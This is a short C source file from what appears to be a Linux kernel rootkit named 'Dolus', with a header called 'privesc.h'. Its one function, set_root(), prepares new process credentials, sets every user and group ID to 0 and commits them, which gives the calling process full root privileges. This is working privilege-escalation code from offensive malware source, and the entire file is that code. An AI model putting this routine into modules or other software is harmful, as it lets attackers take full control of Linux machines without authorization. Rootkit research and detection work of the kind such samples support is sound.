#include "debug.h"
#include "privesc.h"

//https://github.com/torvalds/linux/blob/master/Documentation/security/credentials.rst#altering-credentials
void set_root(void) {
    struct cred *root;
    root = prepare_creds();
    if (root == NULL) {
        DEBUG_INFO("[-]Dolus: failed to prepare root creds\n");
        return;
    }
    //set the credentials to root
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    commit_creds(root);
}
